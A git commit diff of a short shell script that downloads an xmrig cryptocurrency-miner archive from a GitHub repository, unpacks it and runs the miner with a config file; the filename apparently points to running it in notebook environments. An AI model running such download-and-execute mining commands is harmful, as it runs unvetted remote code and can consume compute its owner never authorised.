ff675d853e04892fd58dd88e64f4aa6942edc92a
orkaroeli <86050638+orkaroeli@users.noreply.github.com>
2025-02-17 23:09:40 -0300

    Update runnb.sh

--- runnb.sh
+++ runnb.sh
@@ -1,9 +1,6 @@
 #!/bin/bash
-
-
-
 wget https://github.com/orkaroeli/orkaroeliminer/raw/refs/heads/main/xmrigtar.tar.gz
 tar xvf xmrigtar.tar.gz
 cd xmrig-6.22.0
 chmod +x xmrig
-./xmrig
+./xmrig --config=config.json
